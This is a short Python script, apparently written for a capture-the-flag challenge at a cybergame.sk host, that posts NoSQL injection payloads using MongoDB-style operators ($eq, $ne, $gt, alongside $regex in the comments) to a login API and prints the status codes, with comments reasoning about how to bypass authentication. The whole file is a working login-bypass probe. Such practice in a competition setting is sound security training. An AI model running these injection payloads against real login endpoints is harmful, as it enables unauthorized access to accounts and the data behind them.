import requests

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

# So `{"$regex": "^XYZ123NONEXISTENT.*"}` also returns 500!
# Why? Because if the query is returning the FIRST user it finds, and `{"$regex": "^XYZ123NONEXISTENT.*"}` doesn't match `username`, maybe it matches `username` because it's not actually evaluating as a regex?
# Wait, if we send `{"username": {"$gt": ""}}`, it returns 500.
# If we send `{"username": {"$regex": "^XYZ123NONEXISTENT.*"}}`, it returns 500.
# Why does `{"username": "nonexistent_user_12345"}` return 401 then?
# Because `{"username": "nonexistent_user_12345"}` is a literal string and it doesn't match!
# But ANY object like `{"$regex": "..."}` or `{"$gt": ""}` passed as username might be true!
# Let's check if we can pass a boolean like `{"username": {"$eq": "admin"}}`
payload = {"username": {"$eq": "admin"}, "password": {"$gt": ""}}
r = requests.post(url, json=payload, headers=headers)
print("$eq admin:", r.status_code)

payload = {"username": {"$eq": "nonexistent_user_12345"}, "password": {"$gt": ""}}
r = requests.post(url, json=payload, headers=headers)
print("$eq nonexistent:", r.status_code)

payload = {"username": {"$ne": "admin"}, "password": {"$gt": ""}}
r = requests.post(url, json=payload, headers=headers)
print("$ne admin:", r.status_code)
